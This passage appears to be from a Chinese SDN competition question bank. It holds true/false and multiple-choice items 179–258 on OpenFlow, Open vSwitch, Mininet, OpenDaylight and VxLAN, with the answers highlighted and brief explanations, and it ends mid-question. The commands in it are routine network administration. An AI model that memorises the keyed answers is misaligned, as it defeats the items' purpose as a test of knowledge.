src="/images/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9Bsdn%E8%AE%AD%E7%BB%83%E9%A2%98%E5%BA%93/01.jpg"></strong></p><p> <strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>179.OpenvSwitch是由Nicira、Stanford、UC Berkeley的研究人员共同提出的商业软件交换机，它基于C语言开发。</strong></p><p> <strong>对 <font style="background: yellow ">错</font></strong></p><p><strong>180.安装OpenvSwitch时必须根据系统内核版本选择相应的OpenvSwitch版本。</strong></p><p> <strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>181.查看OpenvSwitch上br0网桥上的流表，应执行命令ovs-vsctl dump-flows br0。</strong></p><p> <strong>对 <font style="background: yellow ">错</font></strong></p><p><strong>182.Mininet由虚拟的终端节点（End-Host）、OpenFlow交换机、控制器（也支持远程控制器）组成，它可以模拟真实网络。</strong></p><p> <strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>183.YANG UI模块用于与OpenDaylight交互，通过动态封装、调用YANG模型和相关REST APIs，生成并展示一个简单的UI界面。</strong></p><p> <strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>184.在交换机中设置OpenFlow1.0协议版本的命令为：ovs-vsctl set bridge br-sw protocols&#x3D;OpenFlow1.0。</strong></p><p> <strong>对 <font style="background: yellow ">错</font></strong></p><p><strong>185.在OpenFlow中，Symmetric（对称）消息指由交换机或控制器主动发起，并需要接受对方的应答的消息，比如Hello、Echo和Packet-In。</strong></p><p> <strong>对 <font style="background: yellow ">错</font></strong></p><p><strong>186.NETCONF 协议定义了配置数据存储和一系列的创建，获取，更新，删除(CRUD)操作，可用于访问数据存储。</strong></p><p> <strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>187.RESTCONF描述了一种 RESTful 协议，此协议提供 HTTP 上的编程接口，用于访问 YANG 定义的数据，使用 NETCONF 定义的数据存储。</strong></p><p> <strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>188.当Postman中选择RESTCONF消息的请求方法为GET时，不需要添加Body体。</strong></p><p> <strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>189.OpenDaylight采用OSGI体系结构，可以解决组件之间的隔离问题。</strong></p><p> <strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>190.下图是通过Postman查询到的交换机内的组表，该组表项的组类型为all。</strong><br><strong><img src="/images/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9Bsdn%E8%AE%AD%E7%BB%83%E9%A2%98%E5%BA%93/02.jpg"></strong></p><p> <strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>191.在Mininet命令行操作界面通过ping操作和iPerf命令可以验证主机间的连通性以及性能带宽分析。</strong></p><p> <strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>192.OVS(Open vSwitch，开放虚拟交换标准)交换机就是一款基于开源软件技术实现的能够集成在服务器虚拟化Hypervisor中的交换机，具备完善的交换机功能，在虚拟化组网中起到了非常重要的作用。</strong></p><p> <strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>193.Flow_mod消息可以用来添加、删除、修改Openflow交换机的流表信息。</strong></p><p> <strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>194.从OpenFlow v1.3开始增加了多级流表和组表的概念。</strong></p><p> <strong>对  <font style="background: yellow ">错</font></strong></p><p><strong>195.Packet-In消息属于controller-to-switch类型的OpenFlow消息。</strong></p><p> <strong>对  <font style="background: yellow ">错</font></strong></p><p><strong>196.OF-CONFIG的本质是提供一个开放接口用于远程配置和控制OpenFlow交换机，并控制流表的内容和数据转发行为。</strong></p><p> <strong>对  <font style="background: yellow ">错</font></strong></p><p><strong>197.SDN架构主要分为三个层次：聚焦各种网络业务开发的应用层，负责资源编排，全局网络管理的控制器层，负责数据转发的基础设施层。</strong></p><p> <strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>198.以下哪项不属于OpenFlow v1.0中流表项的组成(  )</strong></p><p><strong>A、分组头域</strong></p><p><strong>B、计数器</strong></p><p><strong>C、动作表</strong></p><p> <strong><font style="background: yellow ">D、匹配字段</font></strong></p><p><strong>199.以下是一个网桥的具体信息，哪项描述是错误的(  )</strong><br><strong>root@localhost:~# ovs-vsctl show</strong><br><strong>bc12c8d2-6900-42dd-9c1c-30e8ecb99a1b</strong><br><strong>Bridge “br0”</strong><br>  <strong>Port “eth0”</strong><br>    <strong>Interface “eth0”</strong><br>  <strong>Port “br0”</strong><br>    <strong>Interface “br0”</strong><br>      <strong>type: internal</strong><br><strong>ovs_version: “1.4.0+build0”</strong></p><p><strong>A、上述信息显示了一个名为br0的桥（交换机）</strong></p><p> <strong><font style="background: yellow ">B、一个OpenvSwitch交换机只能有一个网桥。</font></strong></p><p><strong>C、这个交换机有两个接口，一个是eth0，一个是br0。</strong></p><p><strong>D、创建桥的时候自动创建一个和桥名字一样的接口br0，并自动作为该桥的一个端口。</strong></p><p><strong>200.Mininet中查看节点的命令是(  )</strong></p><p> <strong><font style="background: yellow ">A、nodes</font></strong></p><p><strong>B、links</strong></p><p><strong>C、dump</strong></p><p><strong>D、pingall</strong></p><p><strong>201.下面关于匹配域解析流程说法正确的是(  )</strong></p><p><strong>A、当SDN交换机接收到一个数据包时，将按照优先级从table1依次匹配其本地保存的流表中的表项。</strong></p><p><strong>B、一旦匹配成功，对应的计数器将更新；而如果没能找到匹配的表项，则将数据包返回给交换机。</strong></p><p> <strong><font style="background: yellow ">C、如果IP数据包编号为1（ICMP数据包）则包含Type和Code字段。</font></strong></p><p><strong>D、初始化包头域，按照包头域的组成设置每个字段，其中出端口是接收数据包的物理端口。</strong></p><p><strong><code>解析：A：当SDN交换机接收到一个数据包时，将按照优先级从table0依次匹配其本地保存的流表中的表项。B：如果没能找到匹配的表项，则将数据包转发给控制器。D：初始化包头域，按照包头域的组成设置每个字段，其中入端口是接收数据包的物理端口。</code></strong></p><p><strong>202.SDN的架构不包括( )</strong></p><p><strong>A、基础设施层</strong></p><p> <strong><font style="background: yellow ">B、链路层</font></strong></p><p><strong>C、控制层</strong></p><p><strong>D、应用层</strong></p><p><strong>203.使用OpenDaylight界面查看流表使用的操作类型是(  )</strong></p><p> <strong><font style="background: yellow ">A、GET</font></strong></p><p><strong>B、PUT</strong></p><p><strong>C、POST</strong></p><p><strong>D、DELETE</strong></p><p><strong>204.流表项动作中没有下列哪一个（ ）</strong></p><p><strong>A、丢弃</strong></p><p><strong>B、转发</strong></p><p><strong>C、上报控制器</strong></p><p> <strong><font style="background: yellow ">D、修改生存时间</font></strong></p><p><strong>205.OpenvSwitch软件交换机删除网桥br-sw的命令是( )</strong></p><p><strong>A、ovs-ofctl del-br br-sw</strong></p><p> <strong><font style="background: yellow ">B、ovs-vsctl del-br br-sw</font></strong></p><p><strong>C、ovs-ofctl del-port br-sw</strong></p><p><strong>D、ovs-vsctl del-port br-sw</strong></p><p><strong>206.OpenFlow下发流表的消息报文是( )</strong></p><p><strong>A、Echo_Request</strong></p><p><strong>B、Feature_Reply</strong></p><p> <strong><font style="background: yellow ">C、Flow_Mod</font></strong></p><p><strong>D、Port_Mod</strong></p><p><strong>207.下面不属于Postman模拟的网页HTTP请求方法的是（ ）</strong></p><p> <strong><font style="background: yellow ">A、ADD</font></strong></p><p><strong>B、PUT</strong></p><p><strong>C、POST</strong></p><p><strong>D、DELETE</strong></p><p><strong>208.下面关于Postman主要功能描述不正确的是( )</strong></p><p><strong>A、Postman可以模拟各种HTTP Requests</strong></p><p><strong>B、Postman可以针对Response内容的格式自动美化</strong></p><p> <strong><font style="background: yellow ">C、Postman支持编写测试脚本，但不能检查Request的结果</font></strong></p><p><strong>D、Postman可以自由设定变量与环境</strong></p><p><strong>209.关于常用的流规则动作output:port描述正确的是( )</strong></p><p><strong>A、写数据到指定的字段</strong></p><p><strong>B、修改源或者目标的MAC地址信息</strong></p><p><strong><font style="background: yellow ">C、输出数据包到指定的端口，port是指端口的OpenFlow端口编号</font></strong></p><p><strong>D、修改源或者目标的IPv4地址信息</strong></p><p><strong>解析：output:port表示输出数据包到指定的端口，port是指端口的OpenFlow端口编号。</strong></p><p><strong>210.添加一条流表项，设置流表项生命周期为1000s，优先级为17，入端口为3，动作是output:2，写法正确的是( )</strong></p><p><strong>A、ovs-vsctl add-flow br0 idle_timeout&#x3D;1000,priority&#x3D;17,in_port&#x3D;3,actions&#x3D;output:2</strong></p><p><strong><font style="background: yellow ">B、ovs-ofctl add-flow br0 idle_timeout&#x3D;1000,priority&#x3D;17,in_port&#x3D;3,actions&#x3D;output:2</font></strong></p><p><strong>C、ovs-vsctl add-flow br0 idle_timeout&#x3D;1000,priority&#x3D;17,port&#x3D;3,actions&#x3D;output:2</strong></p><p><strong>D、ovs-ofctl add-flow br0 idle_timeout&#x3D;1000,priority&#x3D;17,port&#x3D;3,actions&#x3D;output:2</strong></p><p><strong>211.sFlow Collector安装启动后的默认监听端口是多少( )</strong></p><p><strong>A、6342</strong></p><p><strong><font style="background: yellow ">B、6343</font></strong></p><p><strong>C、6345</strong></p><p><strong>D、6346</strong></p><p><strong>212.如何查看已经配置的Agent信息（ ）</strong></p><p><strong>A、ovs-vsctl show</strong></p><p><strong>B、ovs-ofctl show</strong></p><p><strong>C、ovs-ofctl list sflow</strong></p><p><strong><font style="background: yellow ">D、ovs-vsctl list sflow</font></strong></p><p><strong>213.使用Mininet设置一个交换机和n个主机相连的拓扑，命令是（ ）</strong></p><p><strong>A、mn –topo minimal</strong></p><p><strong><font style="background: yellow ">B、mn –topo single,n</font></strong></p><p><strong>C、mn –topo linear,n</strong></p><p><strong>D、mn –topo tree,depth&#x3D;n,fanout&#x3D;m</strong></p><p><strong>214.下面关于OpenDaylight的说法错误的是( )</strong></p><p><strong><font style="background: yellow ">A、OpenDaylight控制器基于Python语言开发，采用了OSGi体系结构。</font></strong></p><p><strong>B、OpenDaylight控制器主要包括：开放的北向API、控制器平面、南向接口和协议插件。</strong></p><p><strong>C、OpenDaylight引入了MD-SAL，可以自动适配包括OpenFlow交换机等底层不同的设备。</strong></p><p><strong>D、OpenDaylight项目的成立代表了传统网络芯片设备商对于SDN这个颠覆性技术的跟进与支持。</strong></p><p><strong>215.对下面的请求消息的Body体解读正确的是( )</strong><br><strong><img src="/images/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9Bsdn%E8%AE%AD%E7%BB%83%E9%A2%98%E5%BA%93/03.jpg"></strong></p><p><strong>A、该请求创建了一个名为mytopo:1的拓扑</strong></p><p><strong>B、有2个underlay拓扑，分别是flow:1和bgp:1</strong></p><p><strong>C、创建的是equality拓扑聚合</strong></p><p><strong><font style="background: yellow ">D、以上都正确</font></strong></p><p><strong>216.关于OpenFlow的发展史说法错误的是（ ）</strong></p><p><strong>A、2006年，斯坦福大学Clean Slate计划资助的Ethane项目开始部署，OpenFlow协议的雏形就诞生于这个项目</strong></p><p><strong>B、2008年，Nick McKeown教授的一篇重要论文“OpenFlow：Enabling Innovation in Campus Networks”使得OpenFlow正式进入人们的视野</strong></p><p><strong><font style="background: yellow ">C、OpenFlow成为标准化组织ONF（Open Network Foundation，开放网络基金会）主推的北向接口协议</font></strong></p><p><strong>D、OpenFlow协议还在不断地演进中</strong></p><p><strong><code>解析：OpenFlow是南向接口。</code></strong></p><p><strong>217.结合如下控制器下发的流表，关于最后两条流表（即框中所画）描述正确的是（ ）</strong><br><strong><img src="/images/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9Bsdn%E8%AE%AD%E7%BB%83%E9%A2%98%E5%BA%93/04.jpg"></strong></p><p><strong><font style="background: yellow ">A、第一条流表：从主机10.0.0.5发往主机10.0.0.3且入端口为port1的数据包从交换机的port2端口转发出去。第二条流表：从主机10.0.0.3发往主机10.0.0.5且入端口为port2的数据包从交换机的port1端口转发出去。</font></strong></p><p><strong>B、第一条流表：从主机10.0.0.5发往主机10.0.0.3且入端口为port2的数据包从交换机的port1端口转发出去。第二条流表：从主机10.0.0.3发往主机10.0.0.5且入端口为port1的数据包从交换机的port2端口转发出去。</strong></p><p><strong>C、第一条流表：从主机10.0.0.5发往主机10.0.0.3且入端口为port1的数据包从交换机的port3端口转发出去。第二条流表：从主机10.0.0.3发往主机10.0.0.5且入端口为port3的数据包从交换机的port1端口转发出去。</strong></p><p><strong>D、第一条流表：从主机10.0.0.5发往主机10.0.0.3且入端口为port3的数据包从交换机的port1端口转发出去。第二条流表：从主机10.0.0.3发往主机10.0.0.5且入端口为port1的数据包从交换机的port3端口转发出去。</strong></p><p><strong>218.以下不属于Flow-Mod消息中的数据匹配字段的是（）</strong></p><p><strong>A、dl_src</strong></p><p><strong><font style="background: yellow ">B、out_port</font></strong></p><p><strong>C、nw_tos</strong></p><p><strong>D、dl_vlan</strong></p><p><strong>219.下图中控制器下发流表的动作类型是（ ）</strong><br><strong><img src="/images/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9Bsdn%E8%AE%AD%E7%BB%83%E9%A2%98%E5%BA%93/05.jpg"></strong></p><p><strong>A、OFPFC_ADD</strong></p><p><strong><font style="background: yellow ">B、OFPFC_DELETE</font></strong></p><p><strong>C、OFPFC_FLOW_MODIFY</strong></p><p><strong>D、OFPFC_FLOW_MODIFY-STRICT</strong></p><p><strong><code>解析：Command字段已表示控制器下发流表的动作类型是OFPFC_DELETE。</code></strong></p><p><strong>220.在控制器上执行命令curl -X POST -d ‘{“switch”:”00:00:00:00:00:00:00:01”, “name”:”ovs2”, “cookie”:”0”, “priority”:”35”,”in_port”:”1”,”active”:”true”,”actions”:”output&#x3D;2”}’ <a href="http://controller-ip:8080/wm/staticflowpusher/json%E5%90%8E%EF%BC%8C%E4%BA%A7%E7%94%9F%E7%9A%84Flow-Mod%E6%B6%88%E6%81%AF%E8%AF%B4%E6%B3%95%E4%B8%8D%E6%AD%A3%E7%A1%AE%E7%9A%84%E6%98%AF%EF%BC%88">http://controller-ip:8080/wm/staticflowpusher/json后，产生的Flow-Mod消息说法不正确的是（</a> ）</strong></p><p><strong>A、Flow-Mod消息中的动作为ADD</strong></p><p><strong><font style="background: yellow ">B、将交换机00:00:00:00:00:00:00:02的port1端口接收到的数据包都从port2转发出去</font></strong></p><p><strong>C、流表项的优先级为35</strong></p><p><strong>D、该Flow-Mod消息被下发到00:00:00:00:00:00:00:01上</strong></p><p><strong>221.关于Packet-in消息描述不正确的是（ ）</strong></p><p><strong>A、Packet-in消息由OpenFlow交换机发出并发送到OpenFlow控制器</strong></p><p><strong>B、当交换机收到一个数据包后，会查找流表，如果流表中没有匹配条目，则交换机会将数据包封装在Packet-in消息中发送给控制器处理</strong></p><p><strong><font style="background: yellow ">C、匹配的流表项中的行动为“发往控制器”（OFPR_ACTION），此时数据包会被缓存在交换机中</font></strong></p><p><strong>D、可以通过Packet-in&#x2F;Packet-out发现交换机之间的链路</strong></p><p><strong>222.关于Packet-in消息解释不正确的是（ ）</strong></p><p><strong><font style="background: yellow ">A、in_port：发送帧的端口</font></strong></p><p><strong>B、reason：发送Packet-in消息的原因</strong></p><p><strong>C、data：包含以太网帧的数据时使用的字段</strong></p><p><strong>D、buffer_id：表示OpenFlow交换机中保存的数据包的缓存ID</strong></p><p><strong><code>解析：in_port：接受帧的端口。</code></strong></p><p><strong>223.关于Packet-out消息描述不正确的是（ ）</strong></p><p><strong>A、Packet-out消息可以用于指定某一个数据包的处理方法</strong></p><p><strong>B、控制器可以使用Packet-out消息，告诉交换机网络中如ARP、IGMP等数据包如何处理</strong></p><p><strong>C、Packet-out消息由OpenFlow控制器发出并发送到OpenFlow交换机</strong></p><p><strong><font style="background: yellow ">D、当用于链路发现时，控制器向一个交换机发送Packet-out消息，actions为从交换机的所有端口转发</font></strong></p><p><strong>224.关于LLDPDU的报文格式说法不正确的是（ ）</strong></p><p><strong>A、LLDPDU采用了TLV的格式，即type+length+value的格式。</strong></p><p><strong>B、Chassis ID TLV是强制的。</strong></p><p><strong><font style="background: yellow ">C、Port ID TLV用于标识发送该LLDPDU的设备的端口，每个LLDPDU可以包含多个该类型的TLV。</font></strong></p><p><strong>D、Time To Live TLV用于告诉接收端，它接收到的这些信息的有效期有多长。</strong></p><p><strong><code>解析：Port ID TLV用于标识发送该LLDPDU的设备的端口，每个LLDPDU必须包含一个且只能包含一个该类型的TLV。</code></strong></p><p><strong>225.结合如下拓扑，关于OpenFlow网络拓扑检测机制说法不正确的是（）</strong><br><strong><img src="/images/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9Bsdn%E8%AE%AD%E7%BB%83%E9%A2%98%E5%BA%93/06.jpg"></strong></p><p><strong>A、SDN控制器构造PacketOut消息向S3的所有端口分别发送LLDP数据包。</strong></p><p><strong>B、控制器向交换机S3中下发流表，流表规则为：将从Controller端口收到的LLDP数据包从他的对应端口发送出去。</strong></p><p><strong>C、控制器向交换机S4中下发流表，流表规则为：将从非Controller接收到LLDP数据包发送给控制器。</strong></p><p><strong><font style="background: yellow ">D、通过以上三步，控制器解析LLDP数据包，控制器便发现了S1与S2之间的完整链路。</font></strong></p><p><strong><code>解析：通过以上三步，控制器只能发现S1与S2之间的单向链路。</code></strong></p><p><strong>226.关于MD-SAL描述错误的是（）</strong></p><p><strong>A、MD-SAL的全称是Model-Driven Service Abstraction Layer</strong></p><p><strong>B、字面意思是模型驱动的服务抽象层</strong></p><p><strong>C、MD-SAL主要的工作就是Provider（数据提供者，一般是南向插件）和Consumer（数据消费者，一般是北向插件）之间的连通性工作</strong></p><p><strong><font style="background: yellow ">D、OpenvSwitch采用了MD-SAL实现北向接口与南向接口的解耦，保证南北向接口独立发展，互不影响</font></strong></p><p><strong><code>解析：OpenDaylight采用了MD-SAL作为控制器平台服务层和南向接口及协议插件层的中间适配层，以实现北向接口与南向接口的解耦，保证南北向接口独立发展，互不影响。</code></strong></p><p><strong>227.下图是通过Postman查看到的交换机内的流表，该流表会对匹配的数据包执行的动作为（）</strong><br><strong><img src="/images/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9Bsdn%E8%AE%AD%E7%BB%83%E9%A2%98%E5%BA%93/07.jpg"></strong></p><p><strong>A、从端口2输出</strong></p><p><strong>B、将数据包丢弃</strong></p><p><strong>C、将数据包上传至控制器</strong></p><p><strong><font style="background: yellow ">D、将数据包广播</font></strong></p><p><strong><code>解析：output-action为FLOOD表示将数据包广播。</code></strong></p><p><strong>228.ovs-ofctl命令的哪个子命令是用于查看交换机流表项的（ ）</strong></p><p><strong><font style="background: yellow ">A、dump-flows</font></strong></p><p><strong>B、dump-tables</strong></p><p><strong>C、dump-ports</strong></p><p><strong>D、add-port</strong></p><p><strong><code>解析：ovs-ofctl dump-flows命令表示查看交换机流表。</code></strong></p><p><strong>229.VxLAN头部字段中用于区分VxLAN的字段为（ ）</strong></p><p><strong><font style="background: yellow ">A、VNI</font></strong></p><p><strong>B、Vlan</strong></p><p><strong>C、Vxlan</strong></p><p><strong>D、Flags</strong></p><p><strong><code>解析：VxLAN头封装包括Flags、VNI和Reserved，其中VNI是VxLAN网络标识，24比特，用于区分VxLAN段。</code></strong></p><p><strong>230.VxLAN能够支持（ ）个网段的划分。</strong></p><p><strong>A、4096</strong></p><p><strong>B、1024</strong></p><p><strong><font style="background: yellow ">C、16M</font></strong></p><p><strong>D、32M</strong></p><p><strong><code>解析：VXLAN引入了类似VLAN ID（VNI）的用户标示，一个VNI代表了一个租户，属于不同VNI的虚拟机之间不能直接进行二层通信。VTEP在对报文进行VXLAN封装时，给VNI分配了24比特的空间，这就意味着VXLAN网络理论上支持多达16M（即：2^24-1）的租户隔离。</code></strong></p><p><strong>231.在网络测试中，常见的用来测量网络连通性或网络性能的工具有（ ）</strong></p><p><strong>A、ping</strong></p><p><strong>B、iperf</strong></p><p><strong>C、route</strong></p><p><strong><font style="background: yellow ">D、ping和iperf</font></strong></p><p><strong>232.关于以下Postman请求信息，理解错误的是（）</strong><br><strong><img src="/images/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9Bsdn%E8%AE%AD%E7%BB%83%E9%A2%98%E5%BA%93/08.jpg"></strong></p><p><strong>A、请求方法为PUT。</strong></p><p><strong>B、Body格式为JSON。</strong></p><p><strong>C、switch-id表示交换机的id信息。</strong></p><p><strong><font style="background: yellow ">D、group-ip为10.0.0.7&#x2F;32。</font></strong></p><p><strong>233.控制器与OpenFlow交换机之间相互发送（ ）消息，用于协商双方的OpenFlow版本号。</strong></p><p><strong>A、Features</strong></p><p><strong>B、Configuration</strong></p><p><strong><font style="background: yellow ">C、Hello</font></strong></p><p><strong>D、Echo</strong></p><p><strong><code>解析：Features：获取交换机特性。Configuration：配置OpenFlow交换机。Hello：用来建立OpenFlow连接。Echo：用来确定交换机与控制器之间的连接状态。</code></strong></p><p><strong>234.控制器向OpenFlow交换机发送（）消息，请求OpenFlow交换机上传自己的详细参数。</strong></p><p><strong><font style="background: yellow ">A、Features</font></strong></p><p><strong>B、Configuration</strong></p><p><strong>C、Hello</strong></p><p><strong>D、Echo</strong></p><p><strong>235.下面哪项不属于OpenFlow v1.0流表项的组成部分的是（ ）</strong></p><p><strong>A、分组头域</strong></p><p><strong><font style="background: yellow ">B、优先级</font></strong></p><p><strong>C、计数器</strong></p><p><strong>D、动作表</strong></p><p><strong>236.当交换机碰到新数据包不知道如何处理，或者Action要求发送给控制器，那么交换机就会用（ ）消息发送给控制器。</strong></p><p><strong>A、Configuration</strong></p><p><strong><font style="background: yellow ">B、Packet-in</font></strong></p><p><strong>C、Flow-mod</strong></p><p><strong>D、Packet-out</strong></p><p><strong>237.下列对OpenFlow组表中Select组类型说法正确的是（）</strong></p><p><strong>A、Group Table中所有的Action Buckets都会被执行</strong></p><p><strong><font style="background: yellow ">B、仅执行Group Table中的某一个Action Bucket</font></strong></p><p><strong>C、执行Group Table中已经定义好的Action Bucket</strong></p><p><strong>D、执行第一个live的Action Bucket</strong></p><p><strong>238.下列OpenFlow消息中，属于对称类型的消息是（）</strong></p><p><strong><font style="background: yellow ">A、Echo消息</font></strong></p><p><strong>B、Packet-In消息</strong></p><p><strong>C、Features消息</strong></p><p><strong>D、Flow-Mod消息</strong></p><p><strong><code>解析：OpenFlow主要有3种类型的消息，分别是Controller-to-Switch、Asynchronous（异步）和Symmetric（对称），Controller-to-Switch包括Features 、Configuration 、Modify-State 、Read-Stats 、Send-Packet和Barrier，异步包括Error 、Packet-in 、Flow-Removed和Port-Status，对称包括Hello 、Echo 和Vendor。</code></strong></p><p><strong>239.下面对OF-CONFIG协议理解错误的是（）</strong></p><p><strong><font style="background: yellow ">A、OF-CONFIG作为OpenFlow协议的“伴侣”协议，会影响到流表的内容和数据转发</font></strong></p><p><strong>B、OF-CONFIG定义了利用NETCONF协议来实现OF-CONFIG协议的传输</strong></p><p><strong>C、OF-CONFIG适用于所有支持OpenFlow协议的交换机，包括软件交换机和硬件交换机</strong></p><p><strong>D、OF-CONFIG最主要的设计目标是协助OpenFlow协议，支持用户远程对OF交换机进行配置和管理</strong></p><p><strong>240.传统网络存在的困境是（）</strong></p><p><strong>A、业务部署慢</strong></p><p><strong>B、集成与协调烦</strong></p><p><strong>C、网络设备部署烦</strong></p><p><strong><font style="background: yellow ">D、以上都是</font></strong></p><p><strong>241.传统网络系统存在的问题是（）</strong></p><p><strong>A、垂直集成的封闭系统</strong></p><p><strong>B、网络功能的简单堆砌</strong></p><p><strong>C、行业创新基本停滞</strong></p><p><strong><font style="background: yellow ">D、以上都是</font></strong></p><p><strong>242.SDN架构不包括以下哪一项（）</strong></p><p><strong>A、SDN控制器</strong></p><p><strong>B、SDN应用</strong></p><p><strong><font style="background: yellow ">C、路由器</font></strong></p><p><strong>D、SDN数据面</strong></p><p><strong>243.关于Mininet描述错误的是（）</strong></p><p><strong>A、Mininet是由斯坦福大学基于Linux Container架构开发的。</strong></p><p><strong>B、Mininet是一个虚拟化网络仿真工具。</strong></p><p><strong>C、Mininet可以创建一个含有主机、交换机、控制器和链路的虚拟化网络。</strong></p><p><strong><font style="background: yellow ">D、使用Mininet进行拓扑测试时需要连接实际的物理网络。</font></strong></p><p><strong>244.第一个OpenFlow控制器是（）</strong></p><p><strong>A、POX</strong></p><p><strong><font style="background: yellow ">B、NOX</font></strong></p><p><strong>C、Floodlight</strong></p><p><strong>D、OpenDaylight</strong></p><p><strong>245.SDN最早雏形是由（）提出的。</strong></p><p><strong>A、ONF</strong></p><p><strong><font style="background: yellow ">B、Stanford University</font></strong></p><p><strong>C、ON.LABS</strong></p><p><strong>D、Cisco</strong></p><p><strong>246.SDN可以在（）中应用。</strong></p><p><strong>A、数据中心</strong></p><p><strong>B、局域网</strong></p><p><strong>C、无线蜂窝网</strong></p><p><strong><font style="background: yellow ">D、以上都是</font></strong></p><p><strong>247.广域网中采用SDWAN方案是为了（）</strong></p><p><strong>A、提高带宽利用率</strong></p><p><strong>B、节省成本</strong></p><p><strong>C、路径集中控制</strong></p><p><strong><font style="background: yellow ">D、以上都是</font></strong></p><p><strong>248.关于Google B4说法不正确的是（）</strong></p><p><strong>A、属于早期的规模商用案例</strong></p><p><strong><font style="background: yellow ">B、南向协议采用的是NETCONF</font></strong></p><p><strong>C、部署和完善使用了3年时间</strong></p><p><strong>D、链路利用率从30%—40%提高到90%</strong></p><p><strong>249.SDN的第一个初创公司是（）</strong></p><p><strong>A、Google</strong></p><p><strong>B、ONF</strong></p><p><strong>C、ON.LAB</strong></p><p><strong><font style="background: yellow ">D、Nicira Networks</font></strong></p><p><strong>250.以下网元中Mininet无法构建的是（）</strong></p><p><strong>A、主机</strong></p><p><strong>B、SDN交换机</strong></p><p><strong><font style="background: yellow ">C、防火墙</font></strong></p><p><strong>D、SDN控制器</strong></p><p><strong>251.以下关于Mininet的文件目录结构说法错误的是（）</strong></p><p><strong>A、核心代码基本在mininet子目录</strong></p><p><strong>B、custom&#x2F;放置自定义的Python文件，用来自定义拓扑</strong></p><p><strong>C、examples&#x2F;包含很多实用案例，包括Miniedit可视化</strong></p><p><strong><font style="background: yellow ">D、util&#x2F;用于放置主运行文件</font></strong></p><p><strong>252.关于Mininet功能说法错误的是（）</strong></p><p><strong>A、支持任意自定义拓扑，主机数可达4096</strong></p><p><strong>B、提供用于网络创建和实验的可扩展Python API</strong></p><p><strong>C、启用复杂的拓扑测试，无需连接物理网络</strong></p><p><strong><font style="background: yellow ">D、Mininet自带控制器功能强大，适合各种场景下的测试</font></strong></p><p><strong>253.使用Mininet设置一个交换机和n个主机相连的拓扑，命令是（）</strong></p><p><strong>A、mn –topo minimal</strong></p><p><strong><font style="background: yellow ">B、mn –topo single,n</font></strong></p><p><strong>C、mn –topo linear,n</strong></p><p><strong>D、mn –topo tree,depth&#x3D;n,fanout&#x3D;m</strong></p><p><strong><code>解析：single：单一拓扑用于设置一个交换机和多个主机相连的拓扑。linear：线形拓扑的交换机连接呈线形排列，且每个交换机所连接主机数目只有一个。tree：树形拓扑的交换机连接成树形排列，且每个交换机所连接主机一般有多个。minimal：创建一个交换机和两个主机相连的简单拓扑。</code></strong></p><p><strong>254.以下Mininet内部交互命令，使用错误的是（）</strong></p><p><strong>A、pingall：所有主机节点之间互Ping</strong></p><p><strong><font style="background: yellow ">B、dump：可以查看链路信息</font></strong></p><p><strong>C、nodes：列出所有的节点信息</strong></p><p><strong>D、py net.get(‘h3’).cmd(‘ifconfig h3-eth0 10.3’)：给h3赋予IP（10.0.0.3）</strong></p><p><strong>255.使用Python脚本创建拓扑，具体脚本内容如下所示，对该脚本描述错误的是（）</strong><br><strong>from mininet.net import Mininet</strong><br><strong>from mininet.topolib import TreeTopo</strong><br><strong>Tree22 &#x3D; TreeTopo(depth&#x3D;2,fanout&#x3D;3)</strong><br><strong>net &#x3D; Mininet(topo&#x3D;Tree22)</strong><br><strong>net.start()</strong><br><strong>net.pingAll()</strong><br><strong>net.stop()</strong></p><p><strong>A、该脚本创建深度为2，每层树枝为3的树型拓扑。</strong></p><p><strong>B、拓扑构建完成后执行主机间的pingall操作。</strong></p><p><strong><font style="background: yellow ">C、该拓扑包括1个交换机和2个主机。</font></strong></p><p><strong>D、pingall操作完成后停止操作。</strong></p><p><strong><code>解析：该拓扑包括4个交换机和9个主机：（s1,s2），（s1,s3），（s1,s4），（s2,,h1），（s2,,h2），（s2,,h3），（s3,,h4），（s3,h5），（s3,h6），（s4,h7）, （s4,h8）, （s4,h9）</code></strong></p><p><strong>256.关于Mininet可视化工具MiniEdit描述错误的是（）</strong></p><p><strong>A、使用Mininet可视化界面方便了用户自定义拓扑创建，为不熟悉Python脚本的使用者创造了更简单的环境，界面直观，可操作性强。</strong></p><p><strong><font style="background: yellow ">B、执行命令sudo ~&#x2F;mininet&#x2F;examples&#x2F;miniedit.py可关闭MiniEdit窗口。</font></strong></p><p><strong>C、MiniEdit的用户界面在画布的左侧显示一排工具图标，并在窗口顶部显示一个菜单栏。</strong></p><p><strong>D、Mininet的可视化界面可进行自定义拓扑和自定义设置。</strong></p><p><strong>257.在网络测试中，常见的用来测量网络连通性或网络性能的工具有（）</strong></p><p><strong>A、ping</strong></p><p><strong>B、iperf</strong></p><p><strong>C、route</strong></p><p><strong><font style="background: yellow ">D、ping和iperf</font></strong></p><p><strong>258.Mininet的网络构建参数（）用于自动设置设备的MAC地址。</strong></p><p><strong><font style="background: yellow 